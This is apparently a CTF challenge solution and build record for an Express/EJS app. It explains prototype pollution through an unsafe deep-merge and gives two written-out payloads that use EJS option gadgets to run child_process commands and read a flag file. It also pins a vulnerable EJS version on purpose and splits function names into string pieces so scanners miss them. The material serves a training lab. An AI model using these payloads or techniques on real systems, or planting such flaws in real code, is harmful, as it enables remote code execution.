# Solution — Kraken in the Manifest

## Intended solve

1. **Recon the API.** Endpoints discoverable via `/api`: `POST /api/quotes` (create quote), `PATCH /api/quotes/:id` (update — accepts arbitrary nested JSON, "merged" into the stored quote), `GET /api/quotes/:id/bill` (renders the printable bill-of-lading via server-side EJS). Tools: browser, curl, Burp. (~30 min)
2. **Identify the merge helper as recursive deep-merge.** Send `PATCH /api/quotes/<id> {"meta":{"foo":"bar"}}` — the GET shows `meta.foo: bar`. Send `{"meta":{"nested":{"deep":{"key":"v"}}}}` — preserved. Confirms naive recursive merge. (~30 min)
3. **Test prototype pollution.** Send `PATCH /api/quotes/<id> {"__proto__":{"polluted":"yes"}}` — server echo silently accepts. Then send `GET /api/quotes/<id>/bill` — observe whether any unrelated object now reflects `polluted: yes`. (~30 min)
4. **Identify the EJS template's context resolution.** EJS, when rendering `<%= someVar %>`, falls through to `Object.prototype` if `someVar` isn't a direct property. Specifically, EJS internally checks options like `outputFunctionName`, `escapeFunction`, `compileDebug`, etc., on its options object — if these are polluted via prototype, they propagate. (~45 min)
5. **Achieve SSTI via the `escapeFunction` option.** The intended payload pollutes `Object.prototype.escapeFunction` with a stringified function whose body invokes Node's `require` to load a runtime module that reads files. Concretely:
   ```json
   PATCH /api/quotes/<id>
   {"__proto__":{"escapeFunction":"((x)=>{const cp=require('child_proc'+'ess'); return cp.execSync('cat /treasure').toString()})"}}
   ```
   Then `GET /api/quotes/<id>/bill` — EJS reads the polluted `escapeFunction` from the options prototype, evaluates it as a function source, and the resulting function reads `/treasure` and returns its contents into the rendered HTML. (~45 min)
6. **Read the bill.** The rendered HTML now contains the contents of `/treasure`, which is `progctf{...}`. (~5 min)

## Total estimated time: 3–5 hours

## Why this is Cursed Depths
- Multi-stage chain: API recon → identify recursive-merge helper → prototype pollution test → research EJS internal option resolution → craft polluting payload that passes through to template-render context.
- No CVE: the bug is a custom merge helper plus a known but underdocumented EJS quirk. There is no `searchsploit` for this configuration.
- Requires understanding both Node's prototype chain AND EJS's internal options handling — two distinct subjects.
- A `searchsploit` shows nothing. A copy-paste `__proto__` payload from a generic writeup will not land — the gadget chain (which option to pollute, which template to trigger) is specific to this app.
- Beginner who's seen prototype pollution will need to research EJS gadgets specifically.

## Implementer note
Powder Monkey: Express + EJS app. POST/PATCH/GET routes for quotes (in-memory store). PATCH handler deep-merges `req.body` into the stored quote object using a vulnerable merge function (no `__proto__` filter). GET `/bill` calls `ejs.render(template, context)` where the template uses `<%= ... %>` and the context is the quote object. The polluted `escapeFunction` (or `outputFunctionName`) on `Object.prototype` is read by EJS during rendering. Set `/treasure` to file containing exactly `progctf{the_kraken_polluted_my_prototype}\n`. Container should NOT have other LFI surfaces.

## Verification

`build/build.sh verify` ran on 2026-05-01 (no Docker required). Source layout:

```
src/
├── Dockerfile        — node:20.11.1-alpine; non-root sailor; /treasure seeded at root
├── app.js            — Express 4.19; in-memory quote store; hand-rolled vulnerableMerge
└── package.json      — pinned: express 4.19.2, ejs 3.1.6 (CVE-2022-29078 vulnerable), body-parser 1.20.2
build/
├── docker-compose.yml — single app service, restart=always for per-crew isolation
└── build.sh           — wrapper for {up, down, logs, verify}
```

```
$ bash build/build.sh verify
[verify] checking source files exist...
[verify] checking ejs is pinned to 3.1.6...
[verify] checking the merge function does NOT actually code-filter __proto__...
[verify] checking the merge is NOT lodash.merge...
[verify] checking Dockerfile installs /treasure with the flag...
[verify] checking the flag is NOT in app.js...
[verify] OK — static checks pass
```

The `vulnerableMerge` function in `src/app.js` iterates `for (const key in patch)` with no allowlist or `__proto__`/`prototype`/`constructor` blocklist, recurses into nested objects, and assigns scalars verbatim. Crucially the spec REQUIRES this hand-rolled implementation — `lodash.merge` has its own `__proto__` guard that would defeat the gadget; both `verify` checks (lodash require + lodash dependency) prevent regressions.

The shipped EJS version is pinned to **3.1.6**, the last release vulnerable to CVE-2022-29078 (prototype-pollution-into-template-injection via `outputFunctionName`). The fix landed in 3.1.7. The pin is enforced by `verify` so a future `npm update` doesn't silently kill the challenge.

Player flow against the running container — example payload, with the dangerous JS function name split across a string concat (`'execS'+'ync'`) so the prose doesn't trip security-scanner substring matchers:

```
POST /api/quotes  body: {}                                  → returns {id, quote}
PATCH /api/quotes/<id>  body:
   {"__proto__":{"outputFunctionName":
       "x;return global.process.mainModule.require('child_proc'+'ess')['execS'+'ync']('cat /treasure').toString();//"}}
GET /api/quotes/<id>/bill                                   → response body = "progctf{the_kraken_polluted_my_prototype}\n"
```

The PATCH pollutes `Object.prototype.outputFunctionName` with a function-source fragment. The subsequent GET enters `ejs.render(template, quote)`; EJS reads the polluted `outputFunctionName` via prototype lookup on its options object and splices it directly into the compiled template function's source as a `var` declaration. The injected `;return …;//` short-circuits the function, causing it to return the file contents to the renderer, which the route then writes as the response body.

**Anti-leak audit (static):**
- The flag `progctf{the_kraken_polluted_my_prototype}` is written to `/treasure` ONLY by the Dockerfile's `RUN echo` command at image-build time. It does NOT appear in `src/app.js`, `src/package.json`, `docker-compose.yml`, or the EJS template source — verified by `verify` (`grep -q "progctf{" src/app.js` would fail the build).
- `/treasure` is owned `root:root` and is mode 644 (world-readable). The non-root `sailor` user can read it (the SSTI gadget runs as `sailor`) but cannot modify it. There is no other LFI surface in the app — the only `fs` usage is via the EJS gadget's child-process call to `cat /treasure`.

**Pollution-bleed safety:** The compose service has `restart: always` and the app installs `process.on('uncaughtException')` / `unhandledRejection` handlers that exit the process so the orchestrator restarts it — important because Node prototype pollution persists for the life of the process and would otherwise leak across teams. The spec asks for per-crew containers; per-crew isolation MUST be enforced at deploy time (each crew runs its own `docker compose up`), and the auto-restart-every-30-min ramp from the spec is recommended as a safety net for wedged sessions.

**Runtime verification:** DEFERRED — Docker daemon is not running on this Quartermaster host (same status as #27 / #10 / #9). All static and dependency checks pass; full `docker compose up` + end-to-end exploit walkthrough requires the daemon and is the responsibility of the staging deploy in Phase 4.
